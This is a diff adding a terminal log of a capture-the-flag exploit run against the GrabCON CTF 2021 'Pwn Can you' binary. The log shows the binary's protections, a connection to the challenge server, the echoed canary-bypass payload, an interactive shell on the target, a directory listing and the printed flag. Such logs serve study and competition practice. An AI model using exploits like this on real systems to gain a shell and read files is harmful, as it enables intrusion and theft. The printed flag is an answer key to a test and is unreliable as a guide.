@@ -1,0 +1,24 @@
+mito@ubuntu:~/CTF/GrabCON_CTF_2021/Pwn_Can_you$ python solve.py r
+[*] '/home/mito/CTF/GrabCON_CTF_2021/Pwn_Can_you/cancancan'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[+] Opening connection to 35.246.42.94 on port 31337: Done
+[*] Switching to interactive mode
+\x14�\x15�\x16�\x17�                                     h                                                                                           \x00                                                                                                                 �   \x80
+_�AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+\xa4\xa8\xff$ id
+/bin/sh: 1: id: not found
+$ ls -l
+total 40
+drwxr-x--- 1 0 1000  4096 Sep  2 17:05 bin
+-rwxr-x--- 1 0 1000 15880 Sep  2 17:07 cancancan
+drwxr-x--- 1 0 1000  4096 Sep  2 17:05 dev
+-rwxr----- 1 0 1000    31 Sep  2 17:07 flag.txt
+drwxr-x--- 1 0 1000  4096 Sep  2 17:05 lib
+drwxr-x--- 1 0 1000  4096 Sep  2 17:05 lib32
+drwxr-x--- 1 0 1000  4096 Sep  2 17:05 lib64
+$ cat flag.txt
+GrabCON{Byp4ss_can4ry_1s_fun!}
